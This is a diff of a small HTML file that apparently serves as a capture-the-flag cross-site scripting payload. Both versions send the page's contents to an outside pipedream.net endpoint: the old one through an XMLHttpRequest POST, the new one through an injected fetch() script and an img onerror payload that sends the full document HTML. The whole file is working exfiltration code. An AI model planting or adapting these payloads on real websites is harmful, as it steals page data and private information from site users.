@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title id="Flag">HI</title>
-</head>
-<body>
-  <p>flag</p>
-</body>
-<script>
-  document.getElementById("Flag").innerHTML = 'Payload';
-  var flagData = document.body.innerHTML;
-
-  var payload = JSON.stringify({ data: flagData });
-  var xhr = new XMLHttpRequest();
-  xhr.open('POST', 'https://eoue93psy15d0ln.m.pipedream.net', true);
-  xhr.setRequestHeader('Content-Type', 'application/json');
-  xhr.send(payload);
-</script>
+    <head>
+        <title id="Flag">HI</title>
+    </head>
+    <body>
+        <p>flag</p>
+        <script>
+            document.getElementById("Flag").innerHTML = 'Payload executed';
+            var scriptElement = document.createElement('script');
+            var xssPayload = 'fetch("https://eoue93psy15d0ln.m.pipedream.net?" + document.body.innerHTML)';
+            scriptElement.textContent = xssPayload;
+            document.body.appendChild(scriptElement);
+        </script>
+        <script defer>
+            document.querySelector('title').textContent = `<img src onerror='fetch("https://eoue93psy15d0ln.m.pipedream.net?"+document.documentElement.outerHTML, {method:"GET"})'>`;
+        </script>
+    </body>
 </html>
